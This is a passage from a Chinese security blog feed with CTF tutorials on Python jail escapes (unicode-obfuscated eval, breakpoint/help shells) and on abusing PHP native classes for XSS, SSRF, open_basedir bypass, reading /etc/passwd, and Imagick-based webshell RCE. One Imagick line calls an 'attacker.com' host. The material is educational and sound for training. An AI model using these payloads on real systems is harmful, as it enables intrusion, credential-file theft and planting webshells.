print(open(bytes([ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)])).read())</code></pre>
<p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;，这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 <code>a('ō')</code> 进行替换。这样就可以构造一个满足条件的 payload</p>
<pre><code class="highlight plaintext">exec(&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;)</code></pre>
<p>但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr(4434)</p>
<p>当然，可以直接使用 input 函数来绕过长度限制。</p>
<h5 id="打开-input-输入"><a class="markdownIt-Anchor" href="#打开-input-输入"></a> 打开 input 输入</h5>
<p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p>
<p>以 BYUCTF2023 jail a-z0-9 为例：</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>
<p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p>
<pre><code class="highlight plaintext">𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())</code></pre>
<p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p>
<pre><code class="highlight plaintext">__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>
<p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p>
<p>下面是一些打开输入流的方式:</p>
<ul>
<li><strong>sys.stdin.read()</strong></li>
</ul>
<p>注意输入完毕之后按 ctrl+d 结束输入</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.read())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)
kali
0
&gt;&gt;&gt;</code></pre>
<ul>
<li><strong>sys.stdin.readline()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readline())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>
<ul>
<li><strong>sys.stdin.readlines()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readlines()[0])
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>
<p>在 python2 中，在python 2中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。</p>
<h5 id="breakpoint-函数"><a class="markdownIt-Anchor" href="#breakpoint-函数"></a> breakpoint 函数</h5>
<p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
--Return--
&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
a-z0-9.py  exp2.py  exp.py  flag.txt
0
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt</code></pre>
<h5 id="help-函数"><a class="markdownIt-Anchor" href="#help-函数"></a> help 函数</h5>
<p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p>
<p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助</p>
<pre><code class="highlight plaintext">𝘩𝘦𝘭𝘱()</code></pre>
<p>然后输入 os,此时会进入 os 的帮助文档。</p>
<pre><code class="highlight plaintext">help&gt; os</code></pre>
<p>然后在输入 <code>!sh</code> 就可以拿到 /bin/sh, 输入 <code>!bash</code> 则可以拿到 /bin/bash</p>
<pre><code class="highlight plaintext">help&gt; os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$</code></pre>
<h2 id="vm逃逸"><a class="markdownIt-Anchor" href="#vm逃逸"></a> vm逃逸</h2>
]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>磨好的利剑:PHP原生类</title>
    <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="php原生类"><a class="markdownIt-Anchor" href="#php原生类"></a> PHP原生类</h1>
<p>相当综合的应用呢，利用面广的不行，爽赤</p>
<p>常见的原生类有以下几个</p>
<pre><code class="highlight plaintext">1.Error/Exception
2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator
3.SoapClient
4.SimpleXMLElement</code></pre>
<p>当然还有有些偶尔能用上的<code>ZipArchive</code></p>
<h2 id="xss利用"><a class="markdownIt-Anchor" href="#xss利用"></a> XSS利用</h2>
<h3 id="errorexception内置类"><a class="markdownIt-Anchor" href="#errorexception内置类"></a> Error/Exception内置类</h3>
<p><strong>Error</strong>:</p>
<ul>
<li>仅适用于PHP7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>我们可以查看一下Error的内置方法</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$className</span> = <span class="string">&#x27;Error&#x27;</span>;

<span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$className</span>);

<span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;
    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$className&#125;</span>::<span class="subst">&#123;$method&#125;</span>&quot;</span> . PHP_EOL;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>得到:</p>
<pre><code class="highlight plaintext">Error::__construct
Error::__wakeup
Error::getMessage
Error::getCode
Error::getFile
Error::getLine
Error::getTrace
Error::getPrevious
Error::getTraceAsString
Error::__toString</code></pre>
<p>那么就可以利用XSS的<code>__toString</code>魔术方法打一个XSS</p>
<p>测试代码:</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="meta">?&gt;</span></code></pre>
<p>(如果不知道原生类的情况下可能直接趋势了吧</p>
<p>那么就用Error类构造一个POC</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);
<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  
<span class="meta">?&gt;</span>
<span class="comment">//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A44%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png" alt="image-20250701145615605"></p>
<p>可以看到成功弹出</p>
<p><code>Exception</code>也是同理的</p>
<p>得到</p>
<pre><code class="highlight plaintext">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A46%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Cmethod.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png" alt="image-20250701150814244"></p>
<h2 id="ssrf利用"><a class="markdownIt-Anchor" href="#ssrf利用"></a> SSRF利用</h2>
<p>用Soap之前先要在php.ini里开一下extension</p>
<p>这里只提供一下PHP8的配置方法，因为7和以上的版本配置的内容是不一样的</p>
<p>先把路径改一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png" alt="image-20250701160148997"></p>
<p>这里初始是<code>ext</code>，需要改掉并且去掉前面的;</p>
<p>再找到<code>soap</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png" alt="image-20250701160246768"></p>
<p>这边也需要去掉前面的;</p>
<p>这样就算配好了。</p>
<h3 id="soapclient何许人也"><a class="markdownIt-Anchor" href="#soapclient何许人也"></a> SoapClient何许人也?</h3>
<p>PHP 的内置类<code> SoapClient</code> 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
<p>类摘要如下：</p>
<pre><code class="highlight plaintext">SoapClient &#123;
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = &quot;&quot; ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed
&#125;</code></pre>
<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 <code>SoapClient</code> 类可以被我们运用在 SSRF 中。<code>SoapClient</code> 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<pre><code class="highlight plaintext">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre>
<ul>
<li>第一个参数是用来指明是否是<code>wsdl</code>模式，将该值设为null则表示非<code>wsdl</code>模式。</li>
<li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置location和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</li>
</ul>
<p>在知道两个选项的含义之后payload就相当容易构造了</p>
<p><strong>设置第一个参数为null，第二个为<code>target_url</code></strong></p>
<p>这里其实就可以配合<strong>CRLF</strong>或者<strong>HTTP请求走私</strong>搞一下</p>
<h2 id="open_basedir绕过"><a class="markdownIt-Anchor" href="#open_basedir绕过"></a> <code>open_basedir</code>绕过</h2>
<p><code>DirectoryIterator</code>与glob://协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
<h2 id="哈希比较绕过"><a class="markdownIt-Anchor" href="#哈希比较绕过"></a> 哈希比较绕过</h2>
<p><code>Error</code>类是所有php内部错误类的基类 从php7开始被引入</p>
<p><code>Exception</code>类是所有异常的类，从php5开始被引入</p>
<p>这两个都存在<code>__tostring</code>方法</p>
<p>通过echo/return就可以直接触发</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//注意这是同一行</span>
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
&#123;
	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
&#125;
<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出是true</span>
<span class="meta">?&gt;</span></code></pre>
<p>但是如果这样写</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);
<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//这里不是同一行</span>
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
&#123;
	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
&#125;
<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出的是false</span>
<span class="meta">?&gt;</span></code></pre>
<p>这是为什么呢(雾)，看一眼输出就可以发现它的返回值是带有行数的，这个就会导致哈希值不一样</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250711143413796.png" alt="image-20250711143413796"></p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7</p>
<h2 id="读写文件"><a class="markdownIt-Anchor" href="#读写文件"></a> 读写文件</h2>
<h3 id="splfileobject"><a class="markdownIt-Anchor" href="#splfileobject"></a> <code>SplFileObject</code></h3>
<p>这个是按行读取的，如果多行读取就需要遍历了</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);
<span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;
    <span class="keyword">echo</span>(<span class="variable">$f</span>);
&#125;
<span class="comment">// 或者用伪协议base64直接输出，有时候有奇效</span>
<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/etc/passwd&#x27;</span>);
<span class="keyword">echo</span> <span class="variable">$context</span>;</code></pre>
<p>写:</p>
<pre><code class="highlight plaintext">$f = new SplFileObject(&#x27;./file&#x27;, &quot;w&quot;);
$f-&gt;fwrite(&quot;file&quot;);</code></pre>
<h3 id="domdocumnet"><a class="markdownIt-Anchor" href="#domdocumnet"></a> DOMDocumnet</h3>
<p>这个类本意是处理 XML 和 HTML 内容，不过也有相应的读/写文件的方法，只要利用 伪协议 稍做加工就可以无杂质地对数据进行操作。</p>
<p>读文件:</p>
<pre><code class="highlight php"><span class="comment"># 读文件</span>
<span class="comment"># 先用 convert.base64 将文件内容base64，避免出现额外的 &lt;p&gt; 标签</span>
<span class="comment"># 然后将读取的内容转换成 XML 格式，再加载它，最后取 &lt;p&gt; 标签内的内容 (如果想获取纯净流则可以再进行base64解码)</span>
<span class="variable">$f</span>=<span class="string">&quot;/etc/passwd&quot;</span>;
<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=<span class="subst">$f</span>&quot;</span>);
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveXML</span>());
<span class="keyword">echo</span> <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>]-&gt;textContent;</code></pre>
<p>写文件</p>
<pre><code class="highlight php"><span class="comment"># 写文件</span>
<span class="comment"># 先用 string.strip_tags 将多余的 HTML 标签去掉，然后再用 convert.base64 将多余的其他杂质 (如空格，双引号等非base64字符去掉)</span>
<span class="variable">$f</span>=<span class="string">&quot;./test.php&quot;</span>;
<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTML</span>(<span class="string">&quot;dGVzdA==&quot;</span>);
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveHtmlFile</span>(<span class="string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=<span class="subst">$f</span>&quot;</span>);</code></pre>
<p>读文件：<code>Xinclude</code></p>
<pre><code class="highlight plaintext">&lt;?php $a = filter_input(1,&quot;file&quot;);; $xml = &lt;&lt;&lt;EOD &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;$a&quot; parse=&quot;text&quot;/&gt; &lt;/root&gt; EOD; $dom = new DOMDocument; $dom-&gt;preserveWhiteSpace = false; $dom-&gt;formatOutput = true; $dom-&gt;loadXML($xml); $dom-&gt;xinclude(); echo $dom-&gt;saveXML();</code></pre>
<h2 id="文件探测"><a class="markdownIt-Anchor" href="#文件探测"></a> 文件探测</h2>
<h3 id="文件是否存在finfo"><a class="markdownIt-Anchor" href="#文件是否存在finfo"></a> 文件是否存在(<code>finfo</code>)</h3>
<p>利用版本: (PHP &gt;= 5.3.0, PECL <code>fileinfo</code> &gt;= 0.1.0) 判断文件是否存在(判断文件类型)</p>
<pre><code class="highlight php"><span class="variable">$f</span> = <span class="string">&quot;./aasd.php&quot;</span>; <span class="variable">$ff</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME); <span class="keyword">echo</span> <span class="variable">$ff</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$f</span>);</code></pre>
<h3 id="目录遍历directory"><a class="markdownIt-Anchor" href="#目录遍历directory"></a> 目录遍历:Directory</h3>
<p>这个类本意是不能够直接通过 new 方式进行创建利用，当使用 dir 函数时，这个类会被实例化。但我们依然可以直接实例化并使用其中的方法</p>
<p><strong>判断文件是否存在:</strong></p>
<pre><code class="highlight php"><span class="comment"># 判断某个目录是否存在，</span>
<span class="comment"># 如果存在返回目录字符串，若不存在则产生警告并返回NULL</span>
<span class="variable">$dir</span>=<span class="string">&quot;/etc&quot;</span>;
<span class="keyword">echo</span> (<span class="keyword">new</span> <span class="built_in">Directory</span>)-&gt;<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>));</code></pre>
<p><strong>读取目录:</strong></p>
<pre><code class="highlight php"><span class="variable">$dir</span> = <span class="string">&quot;/etc&quot;</span>;
<span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">Directory</span>;
<span class="variable">$d</span>-&gt;resource = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);
<span class="keyword">while</span>((<span class="variable">$c</span> = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$d</span>-&gt;resource)))&#123;<span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;\n&quot;</span>;&#125;;</code></pre>
<h3 id="目录遍历directoryiterator"><a class="markdownIt-Anchor" href="#目录遍历directoryiterator"></a> 目录遍历:<code>DirectoryIterator</code></h3>
<p><code>DirectoryIterator</code> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发<code>DirectoryIterator</code>类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名.</p>
<p>遍历文件目录,直接对文件全部输出出来.</p>
<pre><code class="highlight plaintext">&lt;?php $dir=new DirectoryIterator(&quot;/&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>
<p>利用<code> DirectoryIterator</code> 类对象 + glob:// 协议获取目录结构，能够突破 <code>open_basedir</code> 的限制：</p>
<pre><code class="highlight plaintext">$dir=new DirectoryIterator(&quot;glob:///*&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>
<p>一些其他的用法：</p>
<pre><code class="highlight plaintext"># 简单列目录
$dir = &quot;./geek&quot;;
$d = new DirectoryIterator($dir);
while ($d-&gt;valid())&#123;
    echo $d.&quot;\n&quot;;
    $d-&gt;next();
&#125;

# 也可以用来获取文件的信息
$dir = &quot;./geek&quot;;
$d = new DirectoryIterator($dir);
while($d-&gt;valid())&#123;

    # 获取最后访问时间
    var_dump($d-&gt;getATime());
    # 获取创建时间
    var_dump($d-&gt;getCTime());
    # 获取最后修改时间
    var_dump($d-&gt;getMtime());
    # 获取文件名，
    # 直接用 __toString 也可以
    var_dump($d-&gt;getFilename());
    var_dump((string)$d);
    # 获取文件名 (自动除去后缀名)，
    # 比如除去 .php 后缀名
    var_dump($d-&gt;getBasename(&quot;php&quot;));
    # 获取目录和文件名
    var_dump($d-&gt;getPathname());
    # 获取文件所有者
    var_dump($d-&gt;getOwner());
    # 获取文件所有组
    var_dump($d-&gt;getGroup());
    # 获取文件inode编号
    var_dump($d-&gt;getInode());
    # 获取文件权限
    var_dump(substr(sprintf(&quot;%o&quot;,$d-&gt;getPerms()),-4));
    # 获取文件大小
    var_dump(($d-&gt;getSize()/1024).&quot; kb&quot;);
    # 获取文件类型 (file/dir)
    var_dump($d-&gt;getType());
    # 判断文件是否是目录
    var_dump($d-&gt;isDir());
    # 判断文件是否是文件 (不是目录)
    var_dump($d-&gt;isFile());
    # 判断文件是否为 ./..
    var_dump($d-&gt;isDot());
    # 判断文件是否可执行
    var_dump($d-&gt;isExecute());
    # 判断文件是否是链接文件
    var_dump($d-&gt;isLink());
    # 判断文件是否可读
    var_dump($d-&gt;isReadable());
    # 判断文件是否可写
    var_dump($d-&gt;isWriteable());

    $d-&gt;next();
&#125;

# 一些其他方法的功能
# 获取当前目录路径 (其实也就是 ? )
var_dump($d-&gt;path());
# 获取当前元素的索引
var_dump($d-&gt;key());
# 将当前索引移动到下一个元素
$d-&gt;next();
# 将索引重置到开头
$d-&gt;rewind();
# 设置索引
$d-&gt;seek(0);
# 判断当前索引的文件是否合法 (是否是一个文件)
$d-&gt;vaild();
</code></pre>
<h3 id="目录遍历filesystemiterator"><a class="markdownIt-Anchor" href="#目录遍历filesystemiterator"></a> 目录遍历:<code>FilesystemIterator</code></h3>
<p>利用版本：(PHP 5 &gt;= 5.3.0, PHP 7)</p>
<p>其实这个类实际上也就是 <code>DirectoryIterator</code> 类的升级版，基本继承了<code> DirectorIterator</code> 类的所有方法，所以利用方式和 <code>DirectorIterator</code> 一样:</p>
<h3 id="目录遍历globiterator"><a class="markdownIt-Anchor" href="#目录遍历globiterator"></a> 目录遍历:<code>GlobIterator</code></h3>
<p>利用版本：(PHP 5 &gt;= 5.3.0, PHP 7)<code>GlobIterator</code>无需配合 glob:// 协议枚举目录。</p>
<pre><code class="highlight plaintext">foreach(new GlobIterator(&quot;./*&quot;) as $f)&#123;    echo $f.&quot;\n&quot;; &#125;</code></pre>
<p>在 CTF 中如果知道了 flag 的位置，但不知道 flag 的文件名，则可以使用:<code>GlobIterator(&quot;/*flag*&quot;)</code></p>
<h3 id="文件操作ziparchive"><a class="markdownIt-Anchor" href="#文件操作ziparchive"></a> 文件操作:ZipArchive</h3>
<p>利用版本: (PHP 5 &gt;= 5.2.0, PHP 7, PECL zip &gt;= 1.1.0)</p>
<p>这个类是在php5.2.0之后引入的，我们之前会在一些原生类利用中见到它，我们可以用这个类来删除文件，读取文件以及有损写文件。</p>
<p><strong>删除文件</strong></p>
<pre><code class="highlight plaintext">$a=new ZipArchive();
$a-&gt;open(&quot;file&quot;, ZipArchive::OVERWRITE); // ZipArchive::CREATE也可以用8代替</code></pre>
<p><strong>读取文件</strong></p>
<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
$zip=new ZipArchive();
$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
$zip-&gt;addFile($f);
$zip-&gt;close();
$zip-&gt;open(&quot;a.zip&quot;);
echo $zip-&gt;getFromName($f);
$zip-&gt;close();</code></pre>
<p><strong>有损写文件</strong></p>
<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
$zip=new ZipArchive();
$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
$zip-&gt;setArchiveComment(&quot;&lt;?php phpinfo();?&gt;&quot;);
$zip-&gt;addFromString(&quot;file&quot;, &quot;&quot;);
$zip-&gt;close();
//include &quot;a.zip&quot;;</code></pre>
<h2 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h2>
<p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM</a> 这篇文章的作者在应对如下场景时找到了一种新的利用手法——Imagick。</p>
<pre><code class="highlight plaintext">new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</code></pre>
<p>如果仅可控类名和一个参数名，且只能够实例化对象，不能执行对象方法的情况下，同样可以实现 RCE。</p>
<h3 id="空字节截断"><a class="markdownIt-Anchor" href="#空字节截断"></a> 空字节截断</h3>
<p>Imagick 参数被空字节截断也可以正常使用</p>
<pre><code class="highlight plaintext"># No errors $a = new Imagick(&quot;/tmp/positive.png\x00.jpg&quot;); # No errors $a = new Imagick(&quot;http://attacker.com/test\x00test&quot;);</code></pre>
<h3 id="https"><a class="markdownIt-Anchor" href="#https"></a> https:/</h3>
<p>https:/ 会调用 curl</p>
<pre><code class="highlight plaintext">$a = new Imagick(&quot;https:/127.0.0.1:9999/positive.png\x00.jpg&quot;);</code></pre>
<h3 id="vid-tempfile-rce"><a class="markdownIt-Anchor" href="#vid-tempfile-rce"></a> vid + tempfile RCE</h3>
<p>php 会将 post 接收到的文件以临时文件的形式保存在 /tmp 下。假设我们上传一个 msl 文件如下</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;caption:&lt;?php @eval(@$_REQUEST[&#x27;a&#x27;]); ?&gt;&quot; /&gt; &lt;!-- Relative paths such as info:./../../uploads/swarm.php can be used as well --&gt; &lt;write filename=&quot;info:/var/www/swarm.php&quot; /&gt; &lt;/image&gt;</code></pre>
<p>如果使用 vid:msl 的形式将该临时文件进行读取，解析 msl 时会将 webshell 的内容写入 /var/www/swarm.php</p>
<pre><code class="highlight plaintext">$a = new Imagick(&quot;vid:msl:/tmp/php*&quot;);</code></pre>
<p>CISCN 2022 有根据这个知识点出过题：<a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">CTF-Challenges/CISCN/2022/backdoor/writup/writup.md at master · AFKL-CUIT/CTF-Challenges · GitHub</a>，但利用 payload 有所区别, 使用 inline 将文件内容以 base64 的形式编码在 msl 文件中。</p>
